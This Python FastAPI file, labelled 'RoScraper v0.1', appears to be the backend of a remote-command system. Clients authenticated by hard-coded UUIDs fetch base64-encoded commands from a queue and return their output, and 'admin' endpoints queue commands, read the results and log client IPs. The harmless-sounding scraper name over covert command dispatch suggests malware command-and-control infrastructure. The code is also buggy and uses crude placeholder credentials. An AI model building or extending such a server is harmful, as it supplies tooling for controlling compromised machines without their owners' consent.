import re

from fastapi import FastAPI, Response, Request, Form
import logging
import base64

# Configure Logging
logging.basicConfig(filename="logs.log",
                    format='%(asctime)s %(message)s',
                    filemode='w')

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

valid_uuids = ['test-system',
               'ligma',
               'tctcl']

admin_uuids = ['cockandballs']

# Commands are executed in reverse order - fix this.
command_list = ['one',
                'two',
                'three',
                'four']

response_list = ['']

app = FastAPI()


@app.get('/<{uuid}>')
def root(uuid: str):
    return Response('RoScraper v0.1')


@app.get('/ping/<{uuid}>')
def ping(uuid: str):
    return Response('Success')


# command() and command_response() introduce the possibility for race-condition related UB, idc

@app.get('/commands/<{uuid}>')
def command(uuid: str):
    if len(command_list) > 0:
        return Response(encode(command_list[len(command_list) - 1]))
    else:
        return Response('')


@app.get('/command_response/<{uuid}>{response}')
def command_response(response: str):
    if len(command_list) > 0:
        command_list.remove(command_list[len(command_list) - 1])

        response = decode(response)
        response_list.insert(0, response)
        print(response_list[0])
    return Response('')


# Admin endpoints start here
# (these are scary, don't allow access to these without an admin UUID)

@app.get('/admin/queue_command/<{admin_uuid}>{requested_command}')
def admin_queue_command(admin_uuid: str, requested_command: str):
    if admin_uuid in admin_uuids:
        requested_command = encode(requested_command)
        command_list.insert(0, requested_command)
        return Response('')
    else:
        return Response('Admin UUID Required')


@app.get('/admin/view_command_output/<{admin_uuid}>{response}')
def admin_view_command_output(admin_uuid: str, response: str):
    if admin_uuid in admin_uuids:
        command_output = encode(response_list[0])
        return Response(command_output)
    else:
        return Response('Admin UUID Required')


@app.get('/admin/clear_command_queue/<{admin_uuid}>')
def clear_command_queue(admin_uuid: str):
    if admin_uuid in admin_uuids:
        command_list.clear()
        return Response('')
    else:
        return Response('Admin UUID Required')


# Logging middleware
@app.middleware("http")
async def log_request(request: Request, call_next):
    ip = str(request.client.host)
    full_path = str(request.url).replace(str(request.base_url), '')
    start = full_path.find('<')
    end = full_path.find('>')
    uuid = full_path[start + 1:end]
    path = full_path[0:start]

    logger.info(f'{ip}, {uuid}, {path}')

    if uuid in valid_uuids or uuid in admin_uuids:
        response = await call_next(request)
        return response
    else:
        return Response('UUID invalid', status_code=401)


# Misc functions start here

def decode(string):
    try:
        string = string.encode('ascii')
        string = base64.b64decode(string)
        string = string.decode('ascii')
        return string

    except UnicodeDecodeError:
        return ''


def encode(string):
    try:
        string = string.encode('ascii')
        string = base64.b64encode(string)
        string = string.decode('ascii')
        return string

    except UnicodeDecodeError:
        return ''
